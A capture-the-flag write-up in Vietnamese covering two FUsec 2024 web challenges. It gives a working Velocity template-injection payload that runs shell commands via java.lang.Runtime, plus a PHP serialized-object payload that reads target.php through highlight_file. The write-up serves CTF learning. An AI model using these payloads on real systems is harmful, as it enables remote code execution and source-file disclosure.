# Web 1: IsH0wSp33d 

![346514618-c040f3cf-8289-47b0-8070-067431864946](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/b7b888b1-57ba-435f-8967-0f00af761ff5)


1. Initial reconnaissance:

+ đầu tiên trong web khi nhập ta có được 1 số thông tin về template thông báo not found search bar

![346514742-ce74e7e4-74b9-424c-8b94-03da382fc542](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/70830fd6-4869-48bd-9cdc-e8c396c8ab21)


=> điều kì lạ xảy ra khi ta không nhập 1 thông tin gì vào mục search thì nó hiện ra thông tin là **hello, velocity!**

![346514768-7dbb24da-2ac9-455b-a1c1-2787ddcb5188](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/7d367023-25a8-47ae-84a1-c995dac34815)


+ lúc đầu do chưa biết rõ về thông tin lỗ hổng đó nên mình dùng thử brupsuite pro quét qua cái test case trong đó thì mình  tìm ra được lỗ hổng ssti và test case của nó được encode url

![346514812-98ebf14b-24f8-46f3-982b-14287195b037](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/5976b62d-76f3-49c1-8781-650f5195ade2)

sau khi decode thì mình được 1 payload có dạng 

![346514848-f21c3d2e-5c71-41b7-9311-f3985298f33b](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/b4e75f74-7f53-4595-8f5b-f687e35acec5)


sau khi lọc ra test thì ta được payload 

```
#set ($a=7*7) ${a}
```

![346515510-efc9f052-62f0-45b6-b8ae-666ada079507](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/5c79caff-c583-46ae-8892-ebd964f239bc)

=> có vẻ đoán chắc đây là lỗ hổng ssti nhưng ở dạng velocity template sau khi được search 

payload: solve 

```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```


# Web 2: web-secu-challenge 

![346515458-df6a5651-9f47-49c1-bfc8-8bb2a12b64ad](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/82897c54-9ef5-4eb9-b7b6-4a52d8279674)


payload 

```
<?php

// Define the XYZ class
class XYZ {
    public $source;

    public function __toString() {
        return highlight_file($this->source, true);
    }

    public function show() {
        echo $this->source;
    }
}

// Create an instance of the XYZ class
$obj = new XYZ();
$obj->source = 'target.php';

// Serialize the object
$serialized = serialize([$obj]);

// Output the serialized data
echo $serialized;

?>

```

![346515577-faf512e5-0d61-43a5-bca0-fe6010c336eb](https://github.com/neo-M3tinez/FUsec-2024/assets/174318737/7104e74d-e98c-4ee7-babd-36e98925c968)


=> flag: Fusec{flag-418e9146}
